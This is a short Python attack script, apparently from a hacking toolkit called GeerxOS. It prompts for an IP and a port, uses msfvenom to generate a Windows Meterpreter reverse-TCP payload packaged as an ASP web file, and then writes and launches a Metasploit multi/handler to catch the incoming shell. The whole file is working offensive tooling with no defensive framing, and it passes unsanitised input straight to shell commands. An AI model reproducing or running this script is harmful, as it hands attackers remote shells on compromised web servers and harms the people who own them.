import os

#GeerxOS on github!

def asptcp():
    os.system("clear")
    os.system("figlet -f banner ASP ")
    print("--> ")
    ip = input("IP: ")
    print("--> ")
    port = input("Port: ")
    print("--> ")
    name = input("Name: ")
    payload = 'windows/meterpreter/reverse_tcp'
    format= 'asp'
    ext= '.asp'
    print("[!] Creating payload!! [!] ")
    os.system("msfvenom -p "+payload+" LHOST="+ip+" LPORT="+port+" -f "+format+" -o "+name+ext+"")
    print("Payload created!!")
    print("Running metasploit-framework!")
    os.system("echo 'use exploit/multi/handler' >> win_asp.rb")
    os.system("echo 'set payload "+payload+"' >> win_asp.rb")
    os.system("echo 'set lhost "+ip+"' >> win_asp.rb")
    os.system("echo 'set lport "+port+"' >> win_asp.rb")
    os.system("echo 'exploit' >> win_asp.rb")
    os.system("gnome-terminal -- msfconsole -r win_asp.rb &")
    input("Press enter")
    os.system("clear")